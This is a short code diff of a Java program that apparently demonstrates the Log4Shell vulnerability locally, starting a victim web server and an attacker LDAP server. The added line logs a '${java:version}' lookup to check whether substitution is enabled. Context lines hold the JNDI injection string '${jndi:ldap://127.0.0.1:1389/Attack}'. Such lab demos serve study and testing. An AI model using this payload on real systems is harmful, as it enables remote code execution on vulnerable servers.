@@ -22,6 +22,9 @@ public class Main {
     private static final String ATTACK_STRING = "${jndi:ldap://127.0.0.1:1389/Attack}";
 
     public static void main(String[] args) throws IOException, LDAPException {
+        LOGGER.info("${java:version} - if this string does not show your Java version, property substitution in your" +
+                "log4j setup is disabled! Check your Java version!");
+
         new VictimWebServer().start();
 
         new AttackerLdapServer().start();
